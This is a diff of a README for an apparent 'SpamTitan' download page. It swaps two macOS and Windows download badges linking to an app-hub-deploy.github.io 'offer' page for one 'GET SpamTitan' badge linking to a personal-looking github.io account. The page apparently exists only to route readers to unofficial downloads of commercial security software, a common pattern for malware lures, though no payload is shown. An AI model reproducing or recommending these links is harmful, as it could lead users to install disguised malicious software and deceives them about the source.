@@ -1,18 +1,6 @@
 # SpamTitan Download — Email Security Platform
 
-<a href="https://app-hub-deploy.github.io/.github/?offer=SpamTitan" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/SpamTitan%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="SpamTitan for macOS">
-</a>
-
-<a href="https://app-hub-deploy.github.io/.github/?offer=SpamTitan" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/SpamTitan%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="SpamTitan for Windows">
-</a>
+[![GET SpamTitan](https://img.shields.io/badge/GET%20%E2%80%94%20SpamTitan-0078D6?style=for-the-badge&logoColor=white)](https://helenandersonj728.github.io/.github/SpamTitan)
 
 ---
 
